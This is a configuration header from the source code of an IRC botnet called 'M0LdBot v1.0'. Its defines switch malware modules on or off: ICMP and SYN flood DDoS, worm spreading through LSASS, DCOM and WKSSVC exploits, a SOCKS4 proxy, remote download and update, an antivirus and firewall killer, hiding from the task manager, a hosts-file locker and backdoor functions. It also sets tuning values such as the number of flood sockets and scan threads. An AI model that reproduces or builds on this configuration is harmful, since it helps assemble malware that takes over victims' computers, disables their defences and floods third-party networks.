#define vername "M0LdBot v1.0"

//DDoS
// #define NO_DDOS       // disables DDOS
// #define NO_ICMP       // disables ICMP flood.
#define NO_SPYSYN     // disbales SpySYN Flood

//Spreaders/Scanners
#define NO_IMSPREAD   // disables IM spreading functions  // BACKDOOR
#define NO_KAZAA_SHARE// disables KaZaA Share
// #define NO_FTPD
// #define NO_TFTPD
// #define NO_ADVSCAN
// #define NO_LSASS
// #define NO_DCOM135LSASS
// #define NO_DCOM
// #define NO_WKSSVC

//Others
// #define NO_SOCK4SERV  // disables socks4 server.
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_VISIT      // disables visiting URLs
// #define NO_CONNCHECK  // disables check for internet connection
#define NO_IELOWER    // disables ActiveX installer
#define NO_TASKHIDER  // disables hiding from taskmanager
#define NO_AVFW_KILL  // disables a/v f/w killer
#define NO_HOSTCHANGE // disables hostsfile locker
#define NO_LOCALROOT	  // BACKDOOR
// #define NO_REGMON     // disables registry monitor
// #define NO_VIRUSREMOVE   // disables virus remove
// #define NO_MIRCNICK
// #define NO_AVIRUS
// #define NO_SECSYSTEM
// #define NO_PROCESS

//Disabled
#define NO_REDIRECT      // disables port redirect function
#define NO_IDENT         // disables ident server
#define NO_LOCALROOT     // disables local root and security crack (win2k)
#define NO_SPY           // disables irc spy function


//dont mess with this - this is just to remove sploits if there is no scanner
#ifdef NO_ADVSCAN
#define NO_FTPD
#define NO_TFTPD
#define NO_LSASS
#define NO_WKSSVC
#define NO_DCOM
#define NO_DCOM135LSASS
#endif

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define BLOCKSIZE 512 //tftp
#define HSTART "\3\x30\x32"
#define HEND "\3"
#define FLOOD_DELAY 2000
#define MAX_LINES		500
#define MAXTOKENS		32
#define LOGSIZE			128
#define IRCLINE			1024
#define MAXTHREADS		500
#define MAXNICKLEN		28
#define LOGLINE			128
#define MAXSCANTHRD		600
#define MAXSCANTIME		800
#define MAXSTRLEN		500
#define MAX_SYNFLOOD_SOCKETS 200